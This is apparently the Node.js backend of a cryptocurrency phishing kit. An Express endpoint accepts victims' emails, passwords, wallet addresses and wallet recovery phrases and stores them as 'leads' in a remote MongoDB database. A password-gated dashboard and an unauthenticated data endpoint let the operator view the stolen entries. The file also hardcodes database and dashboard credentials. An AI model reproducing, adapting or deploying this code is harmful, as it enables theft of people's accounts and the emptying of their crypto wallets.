const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const cors = require('cors');
const path = require('path');

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(__dirname));

mongoose.connect("mongodb+srv://scumbag3_db_user:Foreverich21@cluster0.zisiplb.mongodb.net/leads?retryWrites=true&w=majority")
  .then(() => console.log("DB Connected"))
  .catch(err => console.error("DB Error:", err));

const Lead = mongoose.model('Lead', new mongoose.Schema({
    email: String, password: String, walletAddress: String, recoveryPhrase: String, timestamp: { type: Date, default: Date.now }
}), 'leads');

// 1. THE SECRET LOCK: Passwords must match to see the dashboard
app.get('/dashboard', (req, res) => {
    const pass = req.query.pass; 
    if (pass === 'Ihadnopurpose21') {
        res.sendFile(path.join(__dirname, 'dashboard.html'));
    } else {
        res.status(403).send("Access Denied: Wrong Password");
    }
});

app.post('/update', async (req, res) => {
    try {
        await new Lead(req.body).save();
        res.status(200).send("Saved");
    } catch (err) { res.status(500).send("Error"); }
});

app.get('/dashboard-data', async (req, res) => {
    const leads = await Lead.find().sort({ timestamp: -1 });
    res.json(leads);
});

app.listen(process.env.PORT || 3000);
